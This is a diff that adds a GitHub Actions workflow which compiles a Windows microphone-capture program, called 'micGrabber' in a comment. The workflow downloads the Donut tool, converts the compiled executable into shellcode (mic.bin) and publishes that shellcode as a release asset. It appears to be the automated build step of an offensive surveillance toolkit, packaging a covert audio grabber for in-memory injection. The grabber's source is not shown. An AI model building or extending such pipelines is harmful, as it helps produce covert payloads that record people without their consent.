@@ -1,0 +1,78 @@
+name: Build Mic
+
+on:
+  push:
+    branches: [ main ]
+    paths: 
+      - 'frontend-src/mic-src/**'
+jobs:
+  build:
+
+    strategy:
+      matrix:
+        configuration: [Release]
+
+    runs-on: windows-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      repository-projects: write
+    steps:
+    - name: Configure MSVC and Build
+      uses: actions/checkout@v3
+    - if: runner.os == 'Windows'
+      working-directory: ./frontend-src/mic-src
+      shell: cmd
+      run: |
+          call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat" 
+          cl /EHsc /O2 /DNDEBUG /MD mic.cpp /link winmm.lib ole32.lib mmdevapi.lib /MACHINE:X64
+    - name: List directory for debugging
+      shell: cmd
+      run: |
+        cd frontend-src\mic-src
+        dir
+        
+     # Delete-tag-and-release new
+    - name: Delete-tag-and-release
+      uses: dev-drprasad/delete-tag-and-release@v1.1
+      with:
+        tag_name: MicBuild #(required) - The name of the tag to delete. This is expected to be solely the tag name, not the name of a git reference.
+        delete_release: true #(optional) default: true - also delete all releases and their assets that are associated to the tag name
+        github_token: ${{ secrets.GITHUB_TOKEN }} # (required) - a GitHub token with write access to the repo where tags and releases will be searched and deleted
+        
+   # Create Release
+    - name: Create Release
+      id: create_release
+      uses: actions/create-release@latest
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        tag_name: MicBuild
+        release_name: MicBuild
+        body: "Release created by GitHub Actions"
+        draft: false
+        prerelease: false
+        
+        # Download Donut
+    - name: Download Donut
+      run: Invoke-WebRequest https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip
+    
+    # Extract Donut
+    - name: Extract donut
+      run: Expand-Archive donut.zip
+
+    # Convert micGrabber To Shellcode 
+    - name: Convert mic-src to Shellcode 
+      run: .\donut\donut.exe -i frontend-src\mic-src\mic.exe -x2 -a2 -o mic.bin -z 4
+
+    # Upload Shellcode Asset
+    - name: Upload Release Asset
+      id: upload-release-asset-donut
+      uses: actions/upload-release-asset@v1
+      env:
+        GITHUB_TOKEN: ${{ secrets.github_token }}
+      with:
+        upload_url: ${{ steps.create_release.outputs.upload_url }}
+        asset_path: mic.bin
+        asset_name: mic.bin
+        asset_content_type: application/zip
